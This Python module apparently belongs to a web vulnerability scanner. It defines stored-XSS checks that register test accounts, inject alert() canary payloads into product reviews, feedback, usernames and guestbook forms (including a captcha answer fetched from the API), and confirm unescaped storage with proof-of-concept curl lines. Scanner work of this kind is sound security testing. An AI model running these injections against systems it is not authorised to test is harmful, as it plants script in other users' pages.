"""
Stored XSS checks:
  - StoredXssReviewCheck   : inject XSS into product reviews, verify persistence
  - StoredXssFeedbackCheck : inject XSS into customer feedback, verify persistence
  - StoredXssProfileCheck  : inject XSS into username/profile fields
"""
import re
import uuid
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck

# XSS canary that's unique and recognisable but not browser-executable on submission
_XSS_CANARY = "<img src=x onerror=alert('{tag}')>"
_XSS_SVG = "<svg/onload=alert('{tag}')>"
_SCRIPT_TAG = "<script>alert('{tag}')</script>"


def _canary_tag(prefix: str = "SXSS") -> str:
    return f"{prefix}_{uuid.uuid4().hex[:8]}"


class StoredXssReviewCheck(BaseScanCheck):
    """
    Injects an XSS payload into product reviews and verifies it is returned
    unescaped in subsequent GET requests — stored/persistent XSS.
    """
    check_id = "xss-stored-review"
    check_type = CheckType.ACTIVE
    name = "Stored XSS (Product Reviews)"
    description = "Injects XSS into product reviews and confirms unescaped reflection on read"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("review", "login", "auth", "product")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Register + login
        uid = uuid.uuid4().hex[:8]
        email = f"sxss_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        try:
            await client.post(
                f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": f"sxss_{uid}", "securityQuestion": {"id": 1},
                      "securityAnswer": "x"},
                headers={"Content-Type": "application/json"},
            )
            login = await client.post(
                f"{base}/rest/user/login",
                json={"email": email, "password": pw},
                headers={"Content-Type": "application/json"},
            )
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            auth = {"Authorization": f"Bearer {token}"}
        except Exception:
            return []

        # Find a product
        product_id = 1
        try:
            r = await client.get(f"{base}/rest/products/search?q=juice")
            if r.status_code == 200:
                ids = re.findall(r'"id"\s*:\s*(\d+)', r.text)
                if ids:
                    product_id = int(ids[0])
        except Exception:
            pass

        payloads = [
            _XSS_CANARY.format(tag=_canary_tag()),
            _XSS_SVG.format(tag=_canary_tag()),
            _SCRIPT_TAG.format(tag=_canary_tag()),
        ]

        for payload in payloads:
            try:
                # Submit review — Juice Shop uses PUT to create reviews
                post_resp = await client.put(
                    f"{base}/rest/products/{product_id}/reviews",
                    json={"message": payload, "author": email},
                    headers={**auth, "Content-Type": "application/json"},
                )
                if post_resp.status_code not in (200, 201):
                    continue

                # Read it back
                get_resp = await client.get(
                    f"{base}/rest/products/{product_id}/reviews",
                )
                body = get_resp.text

                # Check if payload is reflected unescaped
                # If it was properly encoded, < > would be &lt; &gt;
                if payload in body and "&lt;" not in body.split(payload)[0][-20:]:
                    req_raw = (
                        f"POST /rest/products/{product_id}/reviews HTTP/1.1\n"
                        f"Authorization: Bearer <TOKEN>\n"
                        f"Content-Type: application/json\n\n"
                        f'{{"message": "{payload}", "author": "{email}"}}'
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=8.0,
                        description=(
                            f"Stored XSS confirmed in product reviews! "
                            f"Payload {payload[:60]!r} stored unescaped and returned in GET "
                            f"/rest/products/{product_id}/reviews. "
                            f"Any user viewing this product will execute attacker's JavaScript."
                        ),
                        evidence=self._make_evidence(
                            request_raw=req_raw,
                            response=get_resp,
                            payload=payload,
                            poc_curl=(
                                f"# 1. Submit XSS in review:\n"
                                f"curl -s -X POST '{base}/rest/products/{product_id}/reviews' "
                                f"-H 'Authorization: Bearer TOKEN' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"message\":\"{payload}\",\"author\":\"x@x.com\"}}'\n"
                                f"# 2. Verify XSS stored:\n"
                                f"curl -s '{base}/rest/products/{product_id}/reviews' | grep '{payload[:30]}'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue

        return []


class StoredXssFeedbackCheck(BaseScanCheck):
    """
    Injects XSS into customer feedback and confirms it persists in the admin panel.
    Juice Shop: POST /api/Feedbacks → GET /api/Feedbacks (admin readable)
    """
    check_id = "xss-stored-feedback"
    check_type = CheckType.ACTIVE
    name = "Stored XSS (Customer Feedback)"
    description = "Injects XSS into feedback form and confirms unescaped storage"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("feedback", "comment", "login", "auth")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Register + login
        uid = uuid.uuid4().hex[:8]
        email = f"sxss_fb_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        try:
            await client.post(
                f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": f"sxss_fb_{uid}", "securityQuestion": {"id": 1},
                      "securityAnswer": "x"},
                headers={"Content-Type": "application/json"},
            )
            login = await client.post(
                f"{base}/rest/user/login",
                json={"email": email, "password": pw},
                headers={"Content-Type": "application/json"},
            )
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            user_id = login.json().get("authentication", {}).get("umail", uid)
            auth = {"Authorization": f"Bearer {token}"}
        except Exception:
            return []

        payloads = [
            _XSS_CANARY.format(tag=_canary_tag("SXFB")),
            _XSS_SVG.format(tag=_canary_tag("SXFB")),
        ]

        for payload in payloads:
            try:
                # Juice Shop requires captcha for feedback submission
                captcha_resp = await client.get(
                    f"{base}/rest/captcha/",
                    headers=auth,
                )
                captcha_id = 0
                captcha_answer = "0"
                if captcha_resp.status_code == 200:
                    captcha_data = captcha_resp.json()
                    captcha_id = captcha_data.get("captchaId", 0)
                    captcha_answer = str(captcha_data.get("answer", "0"))

                post_resp = await client.post(
                    f"{base}/api/Feedbacks",
                    json={"comment": payload, "rating": 5, "captchaId": captcha_id,
                          "captcha": captcha_answer},
                    headers={**auth, "Content-Type": "application/json"},
                )

                if post_resp.status_code not in (200, 201):
                    continue

                # Check if comment was sanitized (empty string = stripped)
                stored_comment = post_resp.json().get("data", {}).get("comment", "")
                if not stored_comment or stored_comment == "" or stored_comment == "undefined":
                    continue  # Feedback endpoint sanitizes HTML

                # Read back — check if stored unescaped
                get_resp = await client.get(
                    f"{base}/api/Feedbacks",
                    headers=auth,
                )
                body = get_resp.text

                if payload in body:
                    req_raw = (
                        f"POST /api/Feedbacks HTTP/1.1\n"
                        f"Authorization: Bearer <TOKEN>\n"
                        f"Content-Type: application/json\n\n"
                        f'{{"comment": "{payload}", "rating": 5}}'
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=7.5,
                        description=(
                            f"Stored XSS in customer feedback! "
                            f"Payload {payload[:60]!r} stored and returned unescaped via GET /api/Feedbacks. "
                            f"Admin panel renders feedback — XSS executes in admin context (escalation to admin account takeover)."
                        ),
                        evidence=self._make_evidence(
                            request_raw=req_raw,
                            response=get_resp,
                            payload=payload,
                            poc_curl=(
                                f"# 1. Submit XSS in feedback:\n"
                                f"curl -s -X POST '{base}/api/Feedbacks' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"comment\":\"{payload}\",\"rating\":5}}'\n"
                                f"# 2. XSS fires when admin views feedback at /#/administration"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue

        return []


class StoredXssProfileCheck(BaseScanCheck):
    """
    Tests if the username field allows stored XSS through the profile page.
    Juice Shop renders username in the UI without sanitization.
    """
    check_id = "xss-stored-profile"
    check_type = CheckType.ACTIVE
    name = "Stored XSS (User Profile/Username)"
    description = "Detects stored XSS via username field rendered in UI"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        if not any(k in url_lower for k in ("login", "auth", "profile", "/api/users")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        tag = _canary_tag("SXPR")
        payload = _XSS_CANARY.format(tag=tag)

        uid = uuid.uuid4().hex[:8]
        email = f"sxss_pr_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"

        try:
            # Register with XSS username
            reg = await client.post(
                f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": payload, "securityQuestion": {"id": 1},
                      "securityAnswer": "x"},
                headers={"Content-Type": "application/json"},
            )
            if reg.status_code not in (200, 201):
                return []

            stored_username = reg.json().get("data", {}).get("username", "")

            # If payload was accepted (not stripped on creation), check profile
            if tag in stored_username or payload in stored_username:
                login = await client.post(
                    f"{base}/rest/user/login",
                    json={"email": email, "password": pw},
                    headers={"Content-Type": "application/json"},
                )
                token = login.json().get("authentication", {}).get("token", "")
                auth = {"Authorization": f"Bearer {token}"}

                # Try to change username via profile
                profile_resp = await client.post(
                    f"{base}/profile",
                    data={"username": payload},
                    headers={**auth, "Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )

                # Verify profile contains the XSS
                me_resp = await client.get(
                    f"{base}/rest/user/whoami",
                    headers=auth,
                )
                body = me_resp.text

                if tag in body or payload in body:
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=7.5,
                        description=(
                            f"Stored XSS in user profile! Username field accepts HTML/JS payloads. "
                            f"Payload {payload[:60]!r} stored in username field. "
                            f"Rendered unescaped in profile page and wherever username is displayed."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST /api/Users HTTP/1.1\n"
                                f"Content-Type: application/json\n\n"
                                f'{{"username": "{payload}", "email": "{email}", ...}}'
                            ),
                            response=me_resp,
                            payload=payload,
                            poc_curl=(
                                f"curl -s -X POST '{base}/api/Users' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"email\":\"{email}\",\"password\":\"{pw}\","
                                f"\"passwordRepeat\":\"{pw}\","
                                f"\"username\":\"{payload}\","
                                f"\"securityQuestion\":{{\"id\":1}},\"securityAnswer\":\"x\"}}'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
        except Exception:
            pass

        return []


class StoredXssGuestbookCheck(BaseScanCheck):
    """
    Generic stored XSS check for PHP guestbook/comment forms (testphp.vulnweb.com style).

    1. POST payload to guestbook.php / comment.php / post.php
    2. GET the same page and verify the payload was reflected unescaped
    """
    check_id = "xss-stored-guestbook"
    check_type = CheckType.ACTIVE
    name = "Stored XSS (Guestbook / Comment Form)"
    description = "Injects XSS into guestbook/comment endpoints and confirms unescaped storage"

    # Endpoints to probe: (post_path, read_path, field_names)
    _TARGETS = [
        ("/guestbook.php",  "/guestbook.php", ["comment", "text", "message", "body", "name"]),
        ("/comment.php",    "/comment.php",   ["comment", "body", "message", "text"]),
        ("/post.php",       "/post.php",      ["body", "content", "text", "message"]),
        ("/forum.php",      "/forum.php",     ["body", "message", "text"]),
    ]

    _attempted_paths: set = set()

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        # Only trigger on guestbook/comment/post-like pages
        if not any(k in url_lower for k in ("guest", "comment", "gbook", "post", "forum", "board")):
            return []

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        results = []
        for post_path, read_path, fields in self._TARGETS:
            if post_path in self.__class__._attempted_paths:
                continue
            self.__class__._attempted_paths.add(post_path)

            tag = _canary_tag("SXGB")
            payload = _XSS_CANARY.format(tag=tag)

            # Build POST body — try each field name as the vector
            for field in fields:
                try:
                    post_data = {
                        field: payload,
                        "name": "NexusTester",
                        "email": "nexus@test.local",
                    }
                    post_resp = await client.post(
                        f"{base}{post_path}",
                        data=post_data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        follow_redirects=True,
                    )
                    if post_resp.status_code not in (200, 201, 302):
                        continue

                    # Read back and check
                    get_resp = await client.get(
                        f"{base}{read_path}",
                        follow_redirects=True,
                    )
                    body = get_resp.text

                    if tag in body and payload in body:
                        results.append(CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.HIGH,
                            cvss=8.0,
                            description=(
                                f"Stored XSS in {post_path} via field '{field}'. "
                                f"Payload {payload[:60]!r} submitted via POST and returned "
                                f"unescaped on GET {read_path}. "
                                f"Any visitor viewing the page will execute attacker's JavaScript."
                            ),
                            evidence=self._make_evidence(
                                request_raw=(
                                    f"POST {post_path} HTTP/1.1\n"
                                    f"Content-Type: application/x-www-form-urlencoded\n\n"
                                    f"{field}={payload}"
                                ),
                                response=get_resp,
                                payload=payload,
                                poc_curl=(
                                    f"# 1. Submit XSS payload:\n"
                                    f"curl -s -X POST '{base}{post_path}' "
                                    f"-d '{field}={payload}&name=attacker'\n"
                                    f"# 2. Verify stored (check for canary {tag}):\n"
                                    f"curl -s '{base}{read_path}' | grep '{tag}'"
                                ),
                            ),
                            insertion_point=insertion_point,
                        ))
                        break  # Found vuln on this path, move to next target
                except Exception:
                    continue

        return results
